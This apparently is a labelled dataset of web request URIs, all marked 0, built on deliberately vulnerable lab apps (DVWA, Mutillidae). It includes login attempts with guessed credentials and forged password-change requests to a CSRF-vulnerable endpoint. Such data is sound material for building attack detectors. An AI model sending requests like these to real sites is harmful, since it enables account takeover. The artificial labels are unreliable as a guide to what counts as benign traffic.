URI,label
test.com/dvwa/about.php/vulnerabilities/sqli_blind/132,0
test.com/pages,0
test.com,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/1,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/12,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/13,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/16,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/21,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/19,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/23,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/17,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/24,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/100,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/48,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/38,0
test.com/mutillidae/index.php?page=login.php,0
test.com/mutillidae/index.php?username=admin&password=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin&pas=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin&pass=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin&admin=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin&mypass=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=administrator&password=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=administrator&password=password&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=administrator&password=mypass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=administrator&password=mypassword&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=paul&password=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=paul&password=mypass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=paul&pass=mypass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=ali&password=mypass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=ali&pass=mypass&login-php-submit-button=Login,0
test.com/csrf/vulnerabilities/exec/#,0
test.com/csrf/vulnerabilities/exec/1,0
test.com/csrf/vulnerabilities/exec/25,0
test.com/csrf/vulnerabilities/exec/100,0
test.com/csrf/vulnerabilities/exec/20,0
test.com/csrf/vulnerabilities/exec/25,0
test.com/csrf/vulnerabilities/exec/305,0
test.com/csrf/vulnerabilities/exec/21,0
test.com/csrf/vulnerabilities/exec/17,0
test.com/csrf/vulnerabilities/exec/98,0
test.com/sql/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=pass&password_conf=pass&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=new&password_conf=new&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=nene&password_conf=nene&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=markee&password_conf=markee&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=findon&password_conf=findon&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=henet&password_conf=henet&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=drink1&password_conf=drink1&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=01233&password_conf=01233&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=newbee&password_conf=newbee&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=fromcome1&password_conf=fromcome1&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=esi123&password_conf=esi123&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=book1&password_conf=book1&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=hardone&password_conf=hardone&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=newfield&password_conf=newfield&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=newthings1&password_conf=newthings1&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=boatboat&password_conf=boatboat&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=password12&password_conf=password12&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=bananas23&password_conf=bananas23&Change=Change#,0
